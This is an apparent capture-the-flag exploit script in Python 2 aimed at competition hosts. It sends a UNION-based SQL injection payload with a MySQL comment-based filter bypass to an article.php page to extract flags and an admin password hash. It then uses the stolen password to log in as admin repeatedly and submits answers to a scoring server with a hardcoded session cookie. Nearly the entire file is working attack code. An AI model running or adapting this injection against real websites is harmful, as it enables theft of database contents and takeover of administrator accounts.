
# coding=utf-8

import requests
import random
import hashlib
import base64
import time

s = requests.Session()

url='http://172.16.20.212/article.php'


# http://172.16.20.212/article.php?id=0+union+/*!00000select*/+1,flag,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+flags+limit+0,1%23

def get_data_web1():
	url='http://172.16.20.58/article.php'
	# data={"id":payload,"password":"a"}
	payload="0+union+/*!00000select*/+1,flag,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+flags+limit+0,1%23"
	print payload
	r = s.get(url+"?id="+payload)
	index = r.text.encode('utf-8').find('flag')
	print r.text.encode('utf-8')[index:index+42]
	return 1
	# if(lens == 91):
		# return 1
	# else:
		# return 0


def get_data(url):
	# data={"id":payload,"password":"a"}
	payload="0+union+/*!00000select*/+1,flag,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+flags+limit+0,1%23"
	r = s.get(url+"?id="+payload)
	index = r.text.encode('utf-8').find('flag')
	print r.text.encode('utf-8')[index:index+42]
	return 1
	# if(lens == 91):
		# return 1
	# else:
		# return 0

def post_flag():
	urll='http://172.16.4.1/answerCtl/subAnswer'
	data={"answer":"1"}
	cookie={"PHPSESSID":"jn0dutt12ch323ed7sqooslua5","ci_session":"qTUmvaZCc81%2FT8UkmpTbQJmZas5kFqxeiYy%2BI%2BqwyiLAHN%2B4FrgJ5F26DjWMY1JvUvTdNA5iKtf73CpQVGhGpUsd4S1Dt5mwuowXcq8i2rAUtXvOFTzHZVfV%2BfeVMG8za7vysJxRa5RVtmP76Nuqu9jFzqRq8dVGaiVgaqGw8Q62MQkNd6n5vjpSqYYpX%2BeOsAGj7fewUx04JgRV%2BGKvvaFZeGarRGkE6nvDGtehNUVBWNWQYC%2FzjDZTW4RcgraSWy11WSDcZrZW9TWw3YStwtCnh3SUyfgNv75YQJTRA8wsk1GhEJNolUCg9eBw1A%2Bts%2BTC0CuNH35ytw32T4MfGm9moyeXGqlaZ%2FL7m2NcKEuGEXY3dyS3D1zwPJAr1vklGvzXdYa4d9k%2FC8%2FEj56TJ1zG%2Fgs6j%2F74nWK3k9uPjFuBIh8RtgQWHhkOWxGxMUCJgl%2FPGeJmCxCyAjnDO7LS518z2mJ3Tq5vMRcKmct2w9zcJJbpNEcVPpMWZ5myZEjbBKmFysiv7GF8Ve90xWUVfVV5lg9vjQaRxfsnnp6wLjGvMGe8DChRrrrifDinZuAfKwqvlg1jdUJolGovyHWG6w%3D%3D4d8c8133c5a77b3bb9e0fbe7ad0cfa341d3ff1be"}
	r = s.get('http://172.16.4.1/defaultctl/index')
	print r.text.encode('utf-8')
	r = s.post(urll,cookies = cookie,data = data)
	print r.text

def get_passwd():
	url="http://172.16.20.58/article.php?id=0+union+/*!00000select*/+1,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+yzsoumember+limit+0,1%23"
	r = s.get(url)
	index = r.text.encode('utf-8').find('<h4>')
	index2 = r.text.encode('utf-8').find('</h4>3')

	return r.text.encode('utf-8')[index+4:index2]


def jiaoshi():
	url="http://172.16.20.58/run.php?run=user_login"
	data={"logintype":"username","username":"admin","password":get_passwd(),"submit":"%E7%99%BB%E5%BD%95","act":"login","location":"index.php"}
	r = s.post(url,data=data)

	return len(r.text.encode('utf-8'))



def main():
	# get_database(url)
	#get_version(url)
	#get_tables(url)
	#get_columns()
	#get_flag()
	#get_password()
	#test(url)
	# for i range(10,20):
	# get_data_web1()
	# post_flag()
	i = 0
	while(1):
		i+=1
		time.sleep(1)
		print repr(i)+' '+repr(jiaoshi())




if __name__ == '__main__':
    main()
